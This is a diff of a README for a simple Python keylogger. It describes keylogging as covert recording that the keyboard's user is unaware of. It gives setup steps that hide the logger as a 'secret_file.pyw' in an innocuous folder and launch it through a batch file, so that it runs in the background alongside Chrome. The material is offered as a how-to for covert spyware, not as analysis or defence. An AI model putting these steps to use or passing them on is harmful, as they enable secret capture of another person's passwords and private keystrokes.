@@ -4,7 +4,7 @@ A simple keylogger made in Python with the help of pyhook and pywin32 module.
 Keystroke logging, often referred to as keylogging or keyboard capturing, is the action of recording (logging) the keys struck on a keyboard, typically covertly, so that the person using the keyboard is unaware that their actions are being monitored. Data can then be retrieved by the person operating the logging program. A keylogger can be either software or hardware.
 
 1.) First use the above code and copy the .pyw file in a folder. Supposedly, you named it as Important.
-2.) Now create a Notepad File, and write
+2.) To run both Chrome and keylogger in background we have to create a Notepad File, and write
 
       @echo off
       start "" "c:\important\secret_file.pyw"
